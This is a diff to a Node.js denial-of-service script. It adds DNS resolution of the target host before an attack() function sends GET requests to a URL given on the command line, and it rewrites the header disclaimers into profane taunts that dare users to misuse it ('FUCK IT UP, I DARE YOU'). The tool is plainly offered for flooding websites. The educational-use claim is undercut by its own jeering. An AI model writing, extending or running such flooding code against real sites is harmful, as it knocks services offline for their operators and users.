@@ -1,10 +1,10 @@
-// WARNING: THIS TOOL IS FOR EXPERIMENTAL AND EDUCATIONAL PURPOSES ONLY.
-// MISUSE CAN RESULT IN SEVERE LEGAL CONSEQUENCES. USE AT YOUR OWN RISK.
-// THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL. BIGMANCOZMO IS NOT RESPONSIBLE. FUCK IT UP.
+// WARNING: THIS TOOL IS FOR FUCKING EXPERIMENTAL AND EDUCATIONAL PURPOSES ONLY.
+// MISUSE CAN RESULT IN SEVERE LEGAL CONSEQUENCES. USE AT YOUR OWN RISK, YOU FUCKING MORON.
+// THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL. BIGMANCOZMO IS NOT RESPONSIBLE. FUCK IT UP, I DARE YOU.
 
 // DISCLAIMER: THIS TOOL IS CAPABLE OF CAUSING SIGNIFICANT DISRUPTION.
 // IT SHOULD NOT BE USED AGAINST SITES WITHOUT EXPLICIT PERMISSION.
-// TARGETING SITES WITHOUT AUTHORIZATION IS ILLEGAL, UNLESS YOU ARE ME.
+// TARGETING SITES WITHOUT AUTHORIZATION IS ILLEGAL, UNLESS YOU ARE ME, MOTHERFUCKER.
 
 const chalk = require('chalk'); // For colored console output (install using npm install chalk)
 const ddosLog = require('fs').createWriteStream('ddos_log.txt', { flags: 'a' }); // Logging to a file (requires 'fs' module)
@@ -12,6 +12,7 @@ const crypto = require('crypto'); // for generating random shit
 const http = require('http'); // basic http
 const https = require('https'); // secure!
 const { URL } = require('url'); // For robust URL parsing
+const dns = require('dns').promises; // Async DNS resolution
 
 const targetURL = process.argv[2]; // Get target URL from command line
 const threads = process.argv[3] || 10; // Number of threads (default 10)
@@ -52,7 +53,24 @@ function getRandomString(length) {
     return crypto.randomBytes(length).toString('hex');
 }
 
-function attack() {
+async function resolveDNS(hostname) {
+    try {
+        const addresses = await dns.resolve(hostname);
+        return addresses;
+    } catch (error) {
+        logAction(chalk.red(`DNS resolution failed for ${hostname}: ${error.message}`));
+        return null;
+    }
+}
+
+async function attack() {
+    const urlObject = new URL(targetURL);
+    const hostname = urlObject.hostname;
+
+    const ipAddresses = await resolveDNS(hostname);
+    if (!ipAddresses || ipAddresses.length === 0) {
+        return;
+    }
     const options = {
         url: targetURL,
         method: 'GET',
